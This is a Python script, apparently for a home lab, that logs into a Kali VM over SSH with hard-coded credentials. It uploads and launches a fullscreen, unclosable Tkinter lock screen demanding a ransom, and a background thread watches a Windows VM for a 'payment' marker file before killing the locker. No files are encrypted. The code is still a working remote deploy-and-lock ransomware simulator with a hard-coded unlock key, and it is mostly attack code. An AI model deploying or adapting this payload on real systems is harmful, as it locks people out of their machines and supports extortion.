#!/usr/bin/env python3
import sys
import paramiko
import threading
import time

# --- LAB CREDENTIALS ---
TARGET_KALI = "172.16.1.100"
TARGET_WIN = "172.16.1.102"
USERNAME = "CEO"
PASSWORD = "CEOPass123!"

# We need a global reference to the SSH connection so our thread can use it
ssh_kali = None

def check_for_payment():
    """Background thread that checks the Windows VM for the PAID.txt file."""
    global ssh_kali
    print("[*] Started payment monitor thread.")
    
    # Connect to Windows specifically for checking the file via SSH
    try:
        win_ssh = paramiko.SSHClient()
        win_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        win_ssh.connect(TARGET_WIN, username=USERNAME, password=PASSWORD)
    except Exception as e:
        print(f"[-] Monitor thread could not connect to Windows: {e}")
        return

    while True:
        time.sleep(3) # Check every 3 seconds
        try:
            # Check if PAID.txt exists on the Windows Desktop or Temp
            # We check Temp based on the previous Windows script we wrote
            stdin, stdout, stderr = win_ssh.exec_command('if exist C:\\Windows\\Temp\\PAID.txt (echo FOUND)')
            result = stdout.read().decode().strip()
            
            if "FOUND" in result:
                print("\n[+] Payment detected on Windows VM! Ending Kali simulation...")
                # Kill the Kali GUI remotely
                ssh_kali.exec_command("pkill -f ransom_sim.py")
                # Clean up the paid file so it doesn't trigger again on next run
                win_ssh.exec_command('del C:\\Windows\\Temp\\PAID.txt')
                break
        except Exception:
            break
            
    win_ssh.close()

def main():
    global ssh_kali
    
    # Start the background monitor thread
    monitor = threading.Thread(target=check_for_payment, daemon=True)
    monitor.start()

    print(f"[*] Preparing to deploy payload to hardened target {TARGET_KALI}...")

    # The Tkinter Payload. 
    # Note: It tells them to pay on Windows, but we keep the password prompt 
    # as a fallback in case you want to unlock it locally too.
    payload_script = """#!/usr/bin/env python3
import tkinter as tk
import time
import subprocess
import threading

def force_fullscreen():
    time.sleep(0.5)
    try:
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowmove", "0", "0"], check=False)
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowsize", "100%", "100%"], check=False)
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowraise"], check=False)
    except Exception:
        pass

def show_prompt_screen():
    lock_frame.pack_forget()
    prompt_frame.pack(expand=True, fill='both')
    root.focus_force()
    entry.focus_set()
    try:
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowactivate"], check=False)
    except Exception:
        pass

def check_password():
    if entry.get() == "Ransomware2026!":
        prompt_frame.pack_forget()
        lbl.config(text="Decrypting...")
        lock_frame.pack(expand=True, fill='both')
        root.update()
        for i in range(0, 101, 10):
            lbl.config(text=f"Decrypting your files... {i}%")
            root.update()
            time.sleep(0.2)
        root.destroy()

root = tk.Tk()
root.title("System Locked")
root.configure(background='black')
root.overrideredirect(True)
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
root.geometry(f"{screen_width}x{screen_height}+0+0")
root.attributes('-topmost', True) 

# --- FRAME 1: The Lock Screen ---
lock_frame = tk.Frame(root, bg="black")
lock_frame.pack(expand=True, fill='both')

# THE MESSAGE IS UPDATED HERE TO POINT TO WINDOWS
lbl = tk.Label(lock_frame, text="Your Kali files have been simulated-encrypted!\\n\\nYou must pay the ransom on the Windows Device to unlock.", 
               fg="lime", bg="black", font=("Courier", 26, "bold"))
lbl.pack(expand=True, fill='both')

btn = tk.Button(lock_frame, text="Pay Ransom", command=show_prompt_screen, 
                bg="darkred", fg="white", font=("Courier", 20, "bold"))
btn.pack(side="bottom", pady=50)

# --- FRAME 2: The Prompt Screen ---
prompt_frame = tk.Frame(root, bg="black")
prompt_lbl = tk.Label(prompt_frame, text="Enter the decryption key to unlock your files:", 
                      fg="lime", bg="black", font=("Courier", 24, "bold"))
prompt_lbl.pack(expand=True, fill='both')
entry = tk.Entry(prompt_frame, show="*", font=("Courier", 20), width=20)
entry.pack(pady=20)
submit_btn = tk.Button(prompt_frame, text="Decrypt", command=check_password, 
                       bg="darkred", fg="white", font=("Courier", 20, "bold"))
submit_btn.pack(pady=20)
entry.bind('<Return>', lambda event: check_password())
root.protocol("WM_DELETE_WINDOW", lambda: None)
threading.Thread(target=force_fullscreen, daemon=True).start()
root.mainloop()
"""

    try:
        print("[*] Connecting via SSH to Kali...")
        ssh_kali = paramiko.SSHClient()
        ssh_kali.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_kali.connect(TARGET_KALI, username=USERNAME, password=PASSWORD)
        
        print("[*] Uploading payload to Kali /tmp/ransom_sim.py...")
        sftp = ssh_kali.open_sftp()
        with sftp.file('/tmp/ransom_sim.py', 'w') as f:
            f.write(payload_script)
        ssh_kali.exec_command("chmod +x /tmp/ransom_sim.py")
        sftp.close()

        print("[*] Triggering GUI on Kali...")
        exec_cmd = (
            f"export DISPLAY=:0; "
            f"export XAUTHORITY=/home/{USERNAME}/.Xauthority; "
            f"nohup python3 /tmp/ransom_sim.py > /tmp/gui_out.log 2>&1 &"
        )
        ssh_kali.exec_command(exec_cmd)
        
        print("[+] Kali simulation launched. Monitoring Windows for payment...")
        
        # Keep the script alive so the background thread can continue monitoring
        while True:
            time.sleep(1)

    except paramiko.AuthenticationException:
        print("[-] Authentication failed. Check your credentials.")
    except KeyboardInterrupt:
        print("\n[*] Stopping monitor.")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
